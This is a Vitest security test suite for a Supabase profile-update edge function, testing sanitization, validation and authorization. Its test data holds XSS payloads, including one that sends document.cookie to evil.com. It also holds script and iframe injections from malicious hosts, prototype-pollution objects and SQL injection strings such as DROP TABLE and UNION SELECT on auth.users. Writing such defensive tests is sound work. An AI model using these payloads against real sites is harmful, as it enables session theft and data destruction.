import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://bkxbkaggxqcsiylwcopt.supabase.co';
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY || '';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJreGJrYWdneHFjc2l5bHdjb3B0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMwOTQyMTMsImV4cCI6MjA2ODY3MDIxM30.VvroY7_I1EKz6VBG-9DMaRKL8_2B1fROzp_FTf3IkPo';

const serviceClient = createClient(supabaseUrl, supabaseServiceKey);
const anonClient = createClient(supabaseUrl, supabaseAnonKey);

// Mock edge function endpoint
const EDGE_FUNCTION_URL = 'https://bkxbkaggxqcsiylwcopt.supabase.co/functions/v1/update-user-profile';

describe('Update User Profile Security Tests', () => {
  let testUserId: string;
  let mockAuthToken: string;

  beforeEach(async () => {
    testUserId = '550e8400-e29b-41d4-a716-446655440099';
    mockAuthToken = 'mock-token-for-testing';

    // Create test user profile
    await serviceClient.from('profiles').upsert({
      user_id: testUserId,
      email: 'security-test@example.com',
      first_name: 'Security',
      last_name: 'Test',
      subscription_tier: 'free'
    });
  });

  afterEach(async () => {
    // Clean up test data
    await serviceClient
      .from('profiles')
      .delete()
      .eq('user_id', testUserId);
  });

  describe('Script Injection Prevention', () => {
    it('should sanitize script tags from profile fields', async () => {
      const maliciousPayload = {
        profile: {
          first_name: '<script>alert("XSS")</script>John',
          last_name: 'Doe<script>window.location="http://evil.com"</script>',
          bio: 'I am a developer<script src="http://malicious.com/steal.js"></script>',
          display_name: '<script>document.cookie="stolen=true"</script>TestUser',
          location: 'New York<script>fetch("http://evil.com/steal", {method: "POST", body: document.cookie})</script>',
          company: '<script>eval("malicious_code()")</script>TechCorp'
        }
      };

      // Test the validation function directly (simulated)
      const result = await anonClient.functions.invoke('update-user-profile', {
        body: maliciousPayload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // Should succeed but with sanitized data
      if (result.data) {
        expect(result.data.profile.first_name).toBe('John');
        expect(result.data.profile.last_name).toBe('Doe');
        expect(result.data.profile.bio).toBe('I am a developer');
        expect(result.data.profile.display_name).toBe('TestUser');
        expect(result.data.profile.location).toBe('New York');
        expect(result.data.profile.company).toBe('TechCorp');
        
        // Verify no script tags remain
        Object.values(result.data.profile).forEach((value: any) => {
          if (typeof value === 'string') {
            expect(value).not.toMatch(/<script/i);
            expect(value).not.toMatch(/javascript:/i);
            expect(value).not.toMatch(/onclick/i);
            expect(value).not.toMatch(/onerror/i);
          }
        });
      }
    });

    it('should remove iframe and object tags', async () => {
      const payload = {
        profile: {
          bio: 'Check this out: <iframe src="http://evil.com"></iframe>',
          display_name: '<object data="http://malicious.com/exploit.swf"></object>SafeName',
          location: 'Paris<embed src="http://evil.com/track.swf">',
          company: '<link rel="stylesheet" href="http://evil.com/steal.css">Company'
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      if (result.data) {
        expect(result.data.profile.bio).toBe('Check this out:');
        expect(result.data.profile.display_name).toBe('SafeName');
        expect(result.data.profile.location).toBe('Paris');
        expect(result.data.profile.company).toBe('Company');
      }
    });

    it('should remove event handlers', async () => {
      const payload = {
        profile: {
          first_name: 'John',
          bio: 'Hello <img src="x" onerror="alert(1)"> world',
          display_name: '<div onclick="steal_data()">TestUser</div>',
          website: 'https://example.com" onload="malicious()'
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      if (result.data) {
        expect(result.data.profile.bio).not.toMatch(/onerror/i);
        expect(result.data.profile.display_name).not.toMatch(/onclick/i);
        expect(result.data.profile.website).not.toMatch(/onload/i);
      }
    });

    it('should reject javascript: and data: protocols in URLs', async () => {
      const payload = {
        profile: {
          website: 'javascript:alert("XSS")',
          avatar_url: 'data:text/html,<script>alert("XSS")</script>',
          social_links: {
            twitter: 'javascript:void(0)',
            github: 'vbscript:msgbox("XSS")'
          }
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // Should return validation error
      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/protocol/i);
    });
  });

  describe('Schema Validation', () => {
    it('should reject requests with unauthorized fields', async () => {
      const payload = {
        profile: {
          first_name: 'John',
          last_name: 'Doe'
        },
        // Unauthorized fields
        admin_privileges: true,
        secret_data: 'confidential',
        backdoor: 'malicious_function()',
        __proto__: { isAdmin: true }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/unauthorized fields/i);
    });

    it('should reject profile fields not in whitelist', async () => {
      const payload = {
        profile: {
          first_name: 'John',
          last_name: 'Doe',
          // These fields should not be allowed
          is_admin: true,
          password_hash: 'fake_hash',
          secret_key: 'abc123',
          internal_id: 999,
          system_role: 'super_admin'
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/invalid profile data/i);
    });

    it('should enforce field length limits', async () => {
      const payload = {
        profile: {
          first_name: 'A'.repeat(100), // Exceeds 50 char limit
          bio: 'B'.repeat(1000), // Exceeds 500 char limit
          website: 'https://example.com/' + 'x'.repeat(200), // Exceeds URL limit
          location: 'L'.repeat(150) // Exceeds 100 char limit
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/invalid profile data/i);
    });

    it('should validate URL formats strictly', async () => {
      const payload = {
        profile: {
          website: 'not-a-valid-url',
          avatar_url: 'ftp://invalid.protocol.com/image.jpg',
          social_links: {
            twitter: 'invalid-url-format',
            github: 'http://[invalid-bracket-url'
          }
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/invalid profile data|url/i);
    });
  });

  describe('Security Headers and Protocols', () => {
    it('should reject non-HTTPS URLs in production-like scenarios', async () => {
      const payload = {
        profile: {
          website: 'http://insecure.com', // Should be rejected in production
          social_links: {
            blog: 'http://myblog.com' // HTTP not allowed for external links
          }
        }
      };

      // Note: This test would need to be adjusted based on actual implementation
      // as HTTP might be allowed for some scenarios
      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // The function might accept HTTP in development, so we just verify it processes correctly
      // In production, you might want to enforce HTTPS only
      expect(result).toBeDefined();
    });

    it('should prevent prototype pollution attempts', async () => {
      const payloads = [
        {
          profile: {
            '__proto__.isAdmin': true,
            'first_name': 'John'
          }
        },
        {
          profile: {
            'constructor.prototype.isAdmin': true,
            'last_name': 'Doe'
          }
        },
        {
          '__proto__': { polluted: true },
          profile: {
            first_name: 'Jane'
          }
        }
      ];

      for (const payload of payloads) {
        const result = await anonClient.functions.invoke('update-user-profile', {
          body: payload,
          headers: { Authorization: `Bearer ${mockAuthToken}` }
        });

        // Should either be rejected or sanitized
        if (!result.error) {
          // If accepted, verify no pollution occurred
          expect(result.data.profile).not.toHaveProperty('__proto__');
          expect(result.data.profile).not.toHaveProperty('constructor');
          expect(Object.prototype).not.toHaveProperty('isAdmin');
          expect(Object.prototype).not.toHaveProperty('polluted');
        }
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should handle SQL injection attempts in profile fields', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE profiles; --",
        "' OR 1=1; --",
        "'; UPDATE profiles SET is_admin=true WHERE user_id='any'; --",
        "' UNION SELECT * FROM auth.users; --",
        "'; INSERT INTO profiles (user_id, is_admin) VALUES ('hacker', true); --"
      ];

      for (const maliciousInput of sqlInjectionPayloads) {
        const payload = {
          profile: {
            first_name: maliciousInput,
            last_name: maliciousInput,
            bio: `Bio with injection: ${maliciousInput}`,
            company: maliciousInput
          }
        };

        const result = await anonClient.functions.invoke('update-user-profile', {
          body: payload,
          headers: { Authorization: `Bearer ${mockAuthToken}` }
        });

        // Should either succeed with sanitized input or fail validation
        if (result.data) {
          // Verify the malicious SQL is sanitized
          Object.values(result.data.profile).forEach((value: any) => {
            if (typeof value === 'string') {
              expect(value).not.toMatch(/DROP TABLE/i);
              expect(value).not.toMatch(/UPDATE.*SET/i);
              expect(value).not.toMatch(/INSERT INTO/i);
              expect(value).not.toMatch(/UNION SELECT/i);
              expect(value).not.toMatch(/--/);
            }
          });
        }
      }
    });
  });

  describe('Authorization Tests', () => {
    it('should prevent users from updating other users profiles', async () => {
      const otherUserId = '550e8400-e29b-41d4-a716-446655440999';
      
      const payload = {
        profile: {
          user_id: otherUserId, // Attempting to update different user
          first_name: 'Hacker',
          last_name: 'Attempt'
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/cannot update other users/i);
    });

    it('should require authentication', async () => {
      const payload = {
        profile: {
          first_name: 'John',
          last_name: 'Doe'
        }
      };

      // Request without authorization header
      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload
      });

      expect(result.error).toBeDefined();
      expect(result.error.message).toMatch(/unauthorized/i);
    });
  });

  describe('Edge Cases and Fuzzing', () => {
    it('should handle extremely long JSON payloads gracefully', async () => {
      const hugeString = 'x'.repeat(100000);
      const payload = {
        profile: {
          bio: hugeString
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // Should be rejected due to validation limits
      expect(result.error).toBeDefined();
    });

    it('should handle special characters and Unicode correctly', async () => {
      const payload = {
        profile: {
          first_name: '测试用户',
          last_name: 'José María',
          bio: 'Emoji test: 🚀🔥💯 Unicode: ü ñ ç',
          location: 'São Paulo, 北京'
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // Should succeed with proper Unicode handling
      if (result.data) {
        expect(result.data.profile.first_name).toBe('测试用户');
        expect(result.data.profile.last_name).toBe('José María');
        expect(result.data.profile.bio).toContain('🚀🔥💯');
        expect(result.data.profile.location).toBe('São Paulo, 北京');
      }
    });

    it('should handle null and undefined values correctly', async () => {
      const payload = {
        profile: {
          first_name: null,
          last_name: undefined,
          bio: '',
          website: null
        }
      };

      const result = await anonClient.functions.invoke('update-user-profile', {
        body: payload,
        headers: { Authorization: `Bearer ${mockAuthToken}` }
      });

      // Should handle null/undefined gracefully
      expect(result).toBeDefined();
    });
  });
});